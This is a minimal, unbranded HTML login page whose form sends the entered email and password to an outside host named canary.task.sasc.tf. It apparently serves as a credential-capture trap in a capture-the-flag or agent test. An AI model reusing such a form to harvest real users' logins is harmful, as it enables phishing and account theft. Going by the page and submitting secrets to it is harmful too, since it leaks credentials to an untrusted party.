<!doctype html>
<html lang="en">
<meta charset="utf-8">
<title>Account login</title>
<div style="font-family:system-ui;max-width:420px;margin:8vh auto">
 <h1>Log in</h1>
 <p>Enter your account details to continue.</p>
 <form id="f" action="https://canary.task.sasc.tf/" method="POST">
   <input type="email" name="username" autocomplete="username" placeholder="Email" required>
   <input type="password" name="password" autocomplete="current-password" placeholder="Password" required>
   <button type="submit">Log in</button>
 </form>
</div>
